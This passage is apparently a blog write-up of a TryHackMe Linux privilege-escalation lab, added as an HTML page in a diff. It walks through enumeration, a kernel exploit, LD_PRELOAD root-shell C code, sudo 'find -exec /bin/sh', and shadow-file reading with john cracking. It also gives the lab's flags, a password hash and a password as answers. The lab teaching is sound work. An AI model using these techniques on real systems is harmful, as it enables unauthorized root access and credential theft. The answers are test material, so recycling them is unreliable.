@@ -1,0 +1,1255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Linux Privilege Escalation · THM Writeups</title>
+  
+  <meta name="description" content="Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques." />
+  
+
+  <!-- Security headers -->
+  <meta http-equiv="X-Frame-Options" content="DENY" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src 'self' data: https:; script-src 'self' 'unsafe-inline';" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="no-referrer" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/tryhackme/assets/css/style.css" />
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="/tryhackme/" class="nav-logo">
+      <span class="prompt">~/george/thm</span><span class="cursor-blink">_</span>
+    </a>
+    <div class="nav-right">
+      <a href="/tryhackme/" class="nav-link"><span class="cmd-prefix">./</span>index</a>
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer" class="nav-link">
+        <span class="cmd-prefix">~/</span>portfolio
+      </a>
+    </div>
+  </div>
+</nav>
+
+<main class="writeup-main">
+  <div class="container">
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+      <a href="/tryhackme/">writeups</a>
+      <span class="breadcrumb-sep">→</span>
+      <span>Linux Privilege Escalation</span>
+    </div>
+
+    <!-- Writeup header -->
+    <div class="writeup-header">
+      <div class="terminal-bar">
+        <span class="dot dot-red"></span>
+        <span class="dot dot-yellow"></span>
+        <span class="dot dot-green"></span>
+        <span class="terminal-title">PrivilegeEscalation/LinuxPrivilegeEscalation/README.md</span>
+      </div>
+      <div class="writeup-meta">
+        <span class="platform-badge">TryHackMe</span>
+        
+          
+          <span class="tag-pill">privesc</span>
+          
+          <span class="tag-pill">suid</span>
+          
+          <span class="tag-pill">nfs</span>
+          
+          <span class="tag-pill">PATH</span>
+          
+          <span class="tag-pill">cron</span>
+          
+          <span class="tag-pill">linux</span>
+          
+          <span class="tag-pill">find</span>
+          
+          <span class="tag-pill">netstat</span>
+          
+          <span class="tag-pill">getcap</span>
+          
+        
+        
+        <span class="writeup-meta-desc">Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.</span>
+        
+      </div>
+    </div>
+
+    <!-- Writeup body: sidebar + content -->
+    <div class="writeup-body">
+
+      <!-- ToC Sidebar -->
+      <aside class="toc-sidebar" id="tocSidebar">
+        <div class="toc-header">
+          <span class="toc-label">$ cat --toc</span>
+          <button class="toc-toggle" id="tocToggle" aria-label="Toggle table of contents">✕</button>
+        </div>
+        <nav class="toc-nav" id="tocNav">
+          <p class="toc-empty">No headings found.</p>
+        </nav>
+      </aside>
+
+      <!-- Main content -->
+      <div class="writeup-content-wrap">
+        <article class="writeup-content" id="writeupContent">
+          <h1 id="linux-privilege-escalation"><a href="https://tryhackme.com/room/linprivesc">Linux Privilege Escalation</a></h1>
+
+<h2 id="what-is-privilege-escalation">What is Privilege Escalation?</h2>
+
+<p>At it’s core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it’s the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.</p>
+
+<p>Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:</p>
+
+<ul>
+  <li>Resetting passwords</li>
+  <li>Bypassing access controls to compromise protected data</li>
+  <li>Editing software configurations</li>
+  <li>Enabling persistence</li>
+  <li>Changing the privilege of existing (or new) users</li>
+  <li>Execute any administrative command</li>
+</ul>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don’t end once you gain access to a specific system or user privilege level.</p>
+
+<h3 id="hostname">hostname</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">hostname</code> command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).</p>
+
+<h3 id="uname--a">uname -a</h3>
+
+<p>Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.</p>
+
+<h3 id="procversion">/proc/version</h3>
+
+<p>The proc filesystem (procfs) provides information about the target system processes. Looking at <code class="language-plaintext highlighter-rouge">/proc/version</code> may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.</p>
+
+<h3 id="etcissue">/etc/issue</h3>
+
+<p>This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.</p>
+
+<h3 id="ps">ps</h3>
+
+<p>Typing <code class="language-plaintext highlighter-rouge">ps</code> on your terminal will show processes for the current shell.</p>
+
+<p>The output of the <code class="language-plaintext highlighter-rouge">ps</code> (Process Status) will show the following;</p>
+
+<ul>
+  <li>PID: The process ID (unique to the process)</li>
+  <li>TTY: Terminal type used by the user</li>
+  <li>Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)</li>
+  <li>CMD: The command or executable running (will NOT display any command line parameter)</li>
+</ul>
+
+<p>The “ps” command provides a few useful options.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">ps -A</code>: View all running processes</li>
+  <li><code class="language-plaintext highlighter-rouge">ps axjf</code>: View process tree (see the tree formation until <code class="language-plaintext highlighter-rouge">ps axjf</code> is run below)</li>
+</ul>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/xsbohSd.png" alt="" /></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">ps aux</code>: The <code class="language-plaintext highlighter-rouge">aux</code> option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x).</li>
+</ul>
+
+<h3 id="env">env</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">env</code> command will show environmental variables.</p>
+
+<p>The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.</p>
+
+<h3 id="sudo--l">sudo -l</h3>
+
+<p>The target system may be configured to allow users to run some (or all) commands with root privileges. The <code class="language-plaintext highlighter-rouge">sudo -l</code> command can be used to list all commands your user can run using <code class="language-plaintext highlighter-rouge">sudo</code>.</p>
+
+<h3 id="ls"><code class="language-plaintext highlighter-rouge">ls</code></h3>
+
+<p>remember to always use the <code class="language-plaintext highlighter-rouge">ls</code> command with the <code class="language-plaintext highlighter-rouge">-la</code> parameter.</p>
+
+<h3 id="id"><code class="language-plaintext highlighter-rouge">id</code></h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">id</code> command will provide a general overview of the user’s privilege level and group memberships. The <code class="language-plaintext highlighter-rouge">id</code> command can also be used to obtain the same information for another user (e.g. <code class="language-plaintext highlighter-rouge">id user2</code>).</p>
+
+<h3 id="etcpasswd">etc/passwd</h3>
+
+<p>Reading the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file can be an easy way to discover users on the system.</p>
+
+<p>While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/passwd | cut -d ":" -f 1
+</code></pre></div></div>
+
+<p>Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/passwd | grep home
+</code></pre></div></div>
+
+<h3 id="history">history</h3>
+
+<p>Looking at earlier commands with the <code class="language-plaintext highlighter-rouge">history</code> command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.</p>
+
+<h3 id="ifconfig">ifconfig</h3>
+
+<p>The target system may be a pivoting point to another network. The <code class="language-plaintext highlighter-rouge">ifconfig</code> command will give us information about the network interfaces of the system. This can be confirmed using the <code class="language-plaintext highlighter-rouge">ip route</code> command to see which network routes exist.</p>
+
+<h3 id="netstat">netstat</h3>
+
+<p>Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The <code class="language-plaintext highlighter-rouge">netstat</code> command can be used with several different options to gather information on existing connections.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">netstat -a</code>: shows all listening ports and established connections.</li>
+  <li><code class="language-plaintext highlighter-rouge">netstat -at</code> or <code class="language-plaintext highlighter-rouge">netstat -au</code> can also be used to list TCP or UDP protocols respectively.</li>
+  <li><code class="language-plaintext highlighter-rouge">netstat -l</code>: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol</li>
+  <li><code class="language-plaintext highlighter-rouge">netstat -s</code>: list network usage statistics by protocol.</li>
+  <li><code class="language-plaintext highlighter-rouge">netstat -tp</code>: list connections with the service name and PID information. This can also be used with the <code class="language-plaintext highlighter-rouge">-l</code> option to list listening ports.</li>
+  <li><code class="language-plaintext highlighter-rouge">netstat -i</code>: Shows interface statistics.</li>
+</ul>
+
+<p>The <code class="language-plaintext highlighter-rouge">netstat</code> usage you will probably see most often in blog posts, write-ups, and courses is <code class="language-plaintext highlighter-rouge">netstat -ano</code> which could be broken down as follows;</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-a</code>: Display all sockets</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code>: Do not resolve names</li>
+  <li><code class="language-plaintext highlighter-rouge">-o</code>: Display timers</li>
+</ul>
+
+<h3 id="find"><code class="language-plaintext highlighter-rouge">find</code></h3>
+
+<p><strong>Find files:</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">find . -name flag1.txt</code>: find the file named “flag1.txt” in the current directory</li>
+  <li><code class="language-plaintext highlighter-rouge">find /home -name flag1.txt</code>: find the file names “flag1.txt” in the /home directory</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -type d -name config</code>: find the directory named config under “/”</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -type f -perm 0777</code>: find files with the 777 permissions (files readable, writable, and executable by all users)</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -perm a=x</code>: find executable files</li>
+  <li><code class="language-plaintext highlighter-rouge">find /home -user frank</code>: find all files for user “frank” under “/home”</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -mtime 10</code>: find files that were modified in the last 10 days</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -atime 10</code>: find files that were accessed in the last 10 days</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -cmin -60</code>: find files changed within the last hour (60 minutes)</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -amin -60</code>: find files accesses within the last hour (60 minutes)</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -size 50M</code>: find files with a 50 MB size</li>
+</ul>
+
+<p>This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.</p>
+
+<p>The “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “<code class="language-plaintext highlighter-rouge">-type f 2&gt;/dev/null</code>” to redirect errors to “<code class="language-plaintext highlighter-rouge">/dev/null</code>” and have a cleaner output</p>
+
+<p>Folders and files that can be written to or executed from:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">find / -writable -type d 2&gt;/dev/null</code> : Find world-writeable folders</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -perm -222 -type d 2&gt;/dev/null</code>: Find world-writeable folders</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -perm -o w -type d 2&gt;/dev/null</code>: Find world-writeable folders</li>
+  <li><code class="language-plaintext highlighter-rouge">find / -perm -o x -type d 2&gt;/dev/null</code> : Find world-executable folders</li>
+</ul>
+
+<p>Find development tools and supported languages:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">find / -name perl*</code></li>
+  <li><code class="language-plaintext highlighter-rouge">find / -name python*</code></li>
+  <li><code class="language-plaintext highlighter-rouge">find / -name gcc*</code></li>
+</ul>
+
+<p>Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null</code>: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.</li>
+</ul>
+
+<h3 id="questions">Questions</h3>
+
+<p>Q: What is the hostname of the target system?</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_17-02.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">wade7363</code></p>
+
+<p>Q: What is the Linux kernel version of the target system?</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_17-03.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">3.13.0-24-generic</code></p>
+
+<p>Q: What Linux is this?</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_17-07.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">14.04 LTS</code></p>
+
+<p>Q: What version of the Python language is installed on the system?</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_17-08.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">2.7.6</code></p>
+
+<p>Q: What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)</p>
+
+<p>A quick google search specifying the version of the kernel should return the CVE in question.</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">CVE-2015-1328</code></p>
+
+<h2 id="automated-enumeration-tools">Automated Enumeration Tools</h2>
+
+<p>These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories:</p>
+
+<ul>
+  <li><strong>LinPeas</strong>: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS(opens in new tab)</a></li>
+  <li><strong>LinEnum:</strong> <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum(opens in new tab)</a><a href="https://github.com/rebootuser/LinEnum">(opens in new tab)</a></li>
+  <li><strong>LES (Linux Exploit Suggester):</strong> <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester(opens in new tab)</a></li>
+  <li><strong>Linux Smart Enumeration:</strong> <a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration(opens in new tab)</a></li>
+  <li><strong>Linux Priv Checker:</strong> <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li>
+</ul>
+
+<h2 id="privilege-escalation-kernel-exploits">Privilege Escalation: Kernel Exploits</h2>
+
+<p>Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.</p>
+
+<p>Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.</p>
+
+<p>The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.</p>
+
+<p>The Kernel exploit methodology is simple;</p>
+
+<ol>
+  <li>Identify the kernel version</li>
+  <li>Search and find an exploit code for the kernel version of the target system</li>
+  <li>Run the exploit</li>
+</ol>
+
+<p>Although it looks simple, please remember that a failed kernel exploit can lead to a system crash.</p>
+
+<p><strong>Research sources:</strong></p>
+
+<ol>
+  <li>Based on your findings, you can use Google to search for an existing exploit code.</li>
+  <li>Sources such as <a href="https://www.cvedetails.com/">https://www.cvedetails.com/(opens in new tab)</a> can also be useful.</li>
+  <li>Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).</li>
+</ol>
+
+<p><strong>Hints/Notes:</strong></p>
+
+<ol>
+  <li>Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit</li>
+  <li>Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.</li>
+  <li>Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.</li>
+  <li>You can transfer the exploit code from your machine to the target system using the <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> Python module and <code class="language-plaintext highlighter-rouge">wget</code> respectively.</li>
+</ol>
+
+<h3 id="questions-1">Questions</h3>
+
+<p>Q: find and use the appropriate kernel exploit to gain root privileges on the target system.</p>
+
+<p>We found this exploit on exploit-db:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_17-30.png" alt="" /></p>
+
+<p>We download the exploit on our local machine and run an http server using python that we will use to transfer the exploit to the target machine:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 1337
+</code></pre></div></div>
+
+<p>On our target machine, we first <code class="language-plaintext highlighter-rouge">cd</code> into the <code class="language-plaintext highlighter-rouge">/tmp</code> directory, as we don’t have sufficient permissions to <code class="language-plaintext highlighter-rouge">wget</code> the exploit.</p>
+
+<p>We then proceed to download the exploit, compile and run it:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gcc</span> <span class="mi">37292</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">exploit</span>
+<span class="p">.</span><span class="o">/</span><span class="n">exploit</span>
+</code></pre></div></div>
+
+<p>We get a root shell. Movint to <code class="language-plaintext highlighter-rouge">/home</code> directory, we notice a directory of the user <code class="language-plaintext highlighter-rouge">matt</code>, which contains our flag.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_17-26.png" alt="" /></p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_17-29.png" alt="" /></p>
+
+<p>Q: What is the content of the flag1.txt file?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM-28392872729920</code></p>
+
+<h2 id="privilege-escalation-sudo">Privilege Escalation: Sudo</h2>
+
+<p>The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.</p>
+
+<p>Any user can check its current situation related to root privileges using the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>
+
+<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/(opens in new tab)</a> is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.</p>
+
+<p>Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.</p>
+
+<p>In this case, we can use a “hack” to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (<code class="language-plaintext highlighter-rouge">-f</code> : specify an alternate ServerConfigFile).</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/rNpbbL8.png" alt="" /></p>
+
+<p>Loading the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file using this option will result in an error message that includes the first line of the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file.</p>
+
+<p>On some systems, you may see the LD_PRELOAD environment option.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/gGstS69.png" alt="" /></p>
+
+<p>LD_PRELOAD is a function that allows any program to use shared libraries. This <a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">blog post(opens in new tab)</a> will give you an idea about the capabilities of LD_PRELOAD. If the “env_keep” option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.</p>
+
+<p>The steps of this privilege escalation vector can be summarized as follows;</p>
+
+<ol>
+  <li>Check for LD_PRELOAD (with the env_keep option)</li>
+  <li>Write a simple C code compiled as a share object (.so extension) file</li>
+  <li>Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file</li>
+</ol>
+
+<p>The C code will simply spawn a root shell and can be written as follows;</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="c1">  </span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="c1">  </span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="c1">  </span><span class="cp">
+</span>  
+<span class="kt">void</span> <span class="nf">_init</span><span class="p">()</span> <span class="p">{</span>  
+<span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>  
+<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  
+<span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  
+<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>  
+<span class="p">}</span>  
+</code></pre></div></div>
+
+<p>We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;</p>
+
+<p><code class="language-plaintext highlighter-rouge">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p>
+
+<p>We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.</p>
+
+<p>We need to run the program by specifying the LD_PRELOAD option, as follows;</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</code></p>
+
+<p>This will result in a shell spawn with root privileges.</p>
+
+<h3 id="questions-2">Questions</h3>
+
+<p>Q: How many programs can the user “karen” run on the target system with sudo rights?</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_17-38.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">3</code></p>
+
+<p>Q: What is the content of the flag2.txt file?</p>
+
+<p>Since we are allowed to run <code class="language-plaintext highlighter-rouge">find</code> and <code class="language-plaintext highlighter-rouge">less</code> with <code class="language-plaintext highlighter-rouge">sudo</code>, we first search for the file using the former and then open it using the latter:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_17-41.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM-402028394</code></p>
+
+<p>Q: How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">sudo nmap --interactive</code></p>
+
+<p>Q: What is the hash of frank’s password?</p>
+
+<p>We can use <code class="language-plaintext highlighter-rouge">find</code> to spawn a root shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>find <span class="nb">.</span> <span class="nt">-exec</span> /bin/sh <span class="se">\;</span> <span class="nt">-quit</span>
+</code></pre></div></div>
+
+<p>We then can find the hash of frank’s password in <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_17-55.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1</code></p>
+
+<h2 id="privilege-escalation-suid">Privilege Escalation: SUID</h2>
+
+<p>By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.</p>
+
+<p>You will notice these files have an “s” bit set showing their special permission level.</p>
+
+<p><code class="language-plaintext highlighter-rouge">find / -type f -perm -04000 -ls 2&gt;/dev/null</code> will list files that have SUID or SGID bits set.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/fJEeZ4m.png" alt="" /></p>
+
+<p>A good practice would be to compare executables on this list with GTFOBins (<a href="https://gtfobins.github.io/">https://gtfobins.github.io(opens in new tab)</a>). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list <a href="https://gtfobins.github.io/#+suid">https://gtfobins.github.io/#+suid(opens in new tab)</a>).</p>
+
+<p>The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.</p>
+
+<p>The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file or adding our user to <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">nano /etc/shadow</code> will print the contents of the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> and <code class="language-plaintext highlighter-rouge">/etc/passwd</code> files.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unshadow passwd.txt shadow.txt <span class="o">&gt;</span> passwords.txt
+</code></pre></div></div>
+
+<p>The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:</p>
+
+<p>We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/bkOGaHY.png" alt="" /></p>
+
+<p>We will then add this password with a username to the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/huGoEtj.png" alt="" /></p>
+
+<p>Once our user is added (please note how <code class="language-plaintext highlighter-rouge">root:/bin/bash</code> was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.</p>
+
+<h3 id="questions-3">Questions</h3>
+
+<p>We are starting by enumerating the files with the SUID set:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_18-05.png" alt="" /></p>
+
+<p>One binary that stands out is <code class="language-plaintext highlighter-rouge">base64</code>. A quick search on <a href="gtfobins.org">gtfobins</a> returns that we can only use it to read files:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_18-08.png" alt="" /></p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_18-10.png" alt="" /></p>
+
+<p>We use it to get the content of <code class="language-plaintext highlighter-rouge">/etc/shadow</code>:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_18-10_1.png" alt="" /></p>
+
+<p>We use the same idea to get the output of <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. Then on our local machine, we create two files where we paste the content of the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> and <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, and run the command:</p>
+
+<p><code class="language-plaintext highlighter-rouge">unshadow passwd.txt shadow.txt &gt; passwords.txt</code></p>
+
+<p>We then use <code class="language-plaintext highlighter-rouge">john</code> to find us the passwords:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john /usr/share/wordlists/rockyou.txt passwords.txt
+</code></pre></div></div>
+
+<p>Finding the <code class="language-plaintext highlighter-rouge">flag3.txt</code> is as easy as running a <code class="language-plaintext highlighter-rouge">find</code> command to identify its location and then simply using the <code class="language-plaintext highlighter-rouge">base64</code> trick we used before to get the contents of the file.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_18-22.png" alt="" /></p>
+
+<p>Q: Which user shares the name of a great comic book writer?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">gerryconway</code></p>
+
+<p>Q: What is the password of user2?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">Password1</code></p>
+
+<p>Q: What is the content of the flag3.txt file?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM-3847834</code></p>
+
+<h2 id="privilege-escalation-capabilities">Privilege Escalation: Capabilities</h2>
+
+<p>Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.<br />
